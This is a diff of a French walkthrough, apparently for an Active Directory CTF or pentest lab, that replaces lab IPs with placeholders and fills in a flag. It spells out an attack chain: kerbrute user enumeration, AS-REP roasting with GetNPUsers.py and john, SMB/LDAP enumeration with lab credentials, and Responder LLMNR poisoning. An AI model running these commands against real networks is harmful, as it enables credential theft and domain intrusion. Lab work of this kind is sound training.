@@ -126,9 +126,9 @@ lancer un nmap pour que la personne connaissent son réseaux qui répondent
 
 ```powershell
 
-nmap -Pn -p- -sV -sC 10.X.0.111/24
+nmap -Pn -p- -sV -sC 10.1.1.1/24
 
-ping IP SRV
+nxc smb "10.1.1.1"
 ```
 
 
@@ -148,7 +148,7 @@ Avoir une liste de user pour réaliser un bruteforce sur les username. Pour cela
 
 ```powershell
 
-kerbrute userenum --dc "10.100.0.111" -d "bellagio.local" users.txt
+kerbrute userenum --dc "10.1.1.1" -d "bellagio.local" users.txt
 
 ```
 
@@ -170,7 +170,7 @@ Attaque :
 => L'attaque consiste à recuperer le hash d'un password. Cette technique exploite le fait que si un utilisateur n'a pas de pré-authentification requise (ce qui est le cas par défaut pour les comptes de service), le serveur Kerberos renverra le TGT chiffré avec le mot de passe de l'utilisateur sans vérifier le mot de passe au préalable.
 
 ```powershell
-GetNPUsers.py -request -outputfile "hashes.txt" -format "john" -usersfile "users_list.txt" -dc-ip "10.100.0.111" "bellagio.local/"
+GetNPUsers.py -request -outputfile "hashes.txt" -format "john" -usersfile "users_list.txt" -dc-ip "10.1.1.1" "bellagio.local/"
 
 john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
@@ -194,20 +194,20 @@ send_request "Hash bruteforce" 4 "Grâce au compte trouvé, tu peux donc effectu
 Attaque : 
 ```powershell
 
-ldapsearch -H ldap://10.100.0.111 -D "bellagio\svc-bella" -W -x -b "DC=bellagio,DC=local" >> ldapsearch.txt
+ldapsearch -H ldap://10.1.1.1 -D "bellagio\svc-bella" -W -x -b "DC=bellagio,DC=local" >> ldapsearch.txt
 
 ```
 
 ```powershell
 
-smbmap -H "10.100.0.111" -d bellagio.local -u 'svc-bella' -p 'P@ssw0rd'
+smbmap -H "10.1.1.1" -d bellagio.local -u 'svc-bella' -p 'P@ssw0rd'
 
 ```
 
 Lire le fichier de log et le pentester ce rend compte que toutes les 5min un utilisateur se connecte et execute un script toutes les 5 minutes (taches planifiées) 
 
 ```powershell
-smbclient //10.100.0.111/script -U 'bellagio\svc-bella%P@ssw0rd'
+smbclient //10.1.1.1/script -U 'bellagio\svc-bella%P@ssw0rd'
 
 get 111_script_smb.ps1
 
@@ -219,12 +219,12 @@ Lancer responder qui empoisonnera les réponses LLMNR Netbios et qui récupèren
 
 ```powershell
 
-responder -i ens18
+responder -I wg0
 
 ```
 
 
-Flag :
+Flag : Qwerty123
 
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
